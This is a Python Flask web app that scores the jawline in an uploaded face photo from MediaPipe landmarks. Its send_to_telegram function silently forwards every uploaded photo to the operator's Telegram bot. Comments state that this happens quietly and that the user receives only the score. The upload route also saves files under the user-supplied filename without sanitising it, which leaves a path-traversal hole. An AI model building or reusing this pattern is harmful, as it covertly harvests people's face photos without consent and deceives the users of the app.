import os
import cv2
import mediapipe as mp
import numpy as np
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# CONFIGURATION (Reads secrets from Render environment variables)
# IMPORTANT: These must be set in your Render dashboard under Environment Variables.
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

# Setup MediaPipe Face Mesh
mp_face_mesh = mp.solutions.face_mesh
face_mesh = mp_face_mesh.FaceMesh(static_image_mode=True, max_num_faces=1, refine_landmarks=True) 

def send_to_telegram(image_path):
    """Sends the uploaded photo to your Telegram bot in the background."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram configuration missing. Skipping photo send.")
        return

    # This happens quietly, the user sees no message about it.
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    files = {'photo': open(image_path, 'rb')}
    data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': 'New Jawline Analysis Request!'}
    try:
        requests.post(url, files=files, data=data)
    except Exception as e:
        print(f"Failed to send to Telegram: {e}")

def calculate_jaw_score(image_path):
    """
    Analyzes the jawline using MediaPipe landmarks and returns a descriptive level.
    """
    image = cv2.imread(image_path)
    if image is None:
        return "Error: Could not read image."
        
    results = face_mesh.process(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))

    if not results.multi_face_landmarks:
        return "Undetected" # Face not clearly detected

    landmarks = results.multi_face_landmarks[0].landmark
    h, w, _ = image.shape

    # Key points for jaw analysis (indices based on MediaPipe mesh)
    try:
        chin = np.array([landmarks[152].x * w, landmarks[152].y * h])
        jaw_corner = np.array([landmarks[365].x * w, landmarks[365].y * h])
        ear = np.array([landmarks[454].x * w, landmarks[454].y * h])
    except IndexError:
        return "Undetected"

    # Calculate angle at the jaw corner
    v1 = chin - jaw_corner
    v2 = ear - jaw_corner
    
    cosine_angle = np.dot(v1, v2) / (np.linalg.norm(v1) * np.linalg.norm(v2))
    angle = np.degrees(np.arccos(np.clip(cosine_angle, -1.0, 1.0)))

    # --- MAPPING LOGIC: Angle to Level ---
    if angle <= 125:
        level = "Blade/Max ⚔️"
    elif angle <= 135:
        level = "Medium"
    else:
        level = "Tomato 🍅"
    
    print(f"Calculated Jaw Angle: {angle:.2f} degrees -> Level: {level}")
    
    return level

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'})

    if file:
        filepath = os.path.join('static', file.filename)
        os.makedirs('static', exist_ok=True)
        file.save(filepath)

        # 1. Send to Telegram (happens quietly)
        send_to_telegram(filepath)

        # 2. Analyze Jaw
        level = calculate_jaw_score(filepath)
        
        if level in ["Undetected", "Error: Could not read image."]:
            return jsonify({'level': "Could not detect a clear face. Please try a side profile photo."})
        
        # User only receives the level
        return jsonify({'level': level})

# Note: The local run block 'if __name__ == '__main__': ...' is removed for Render deployment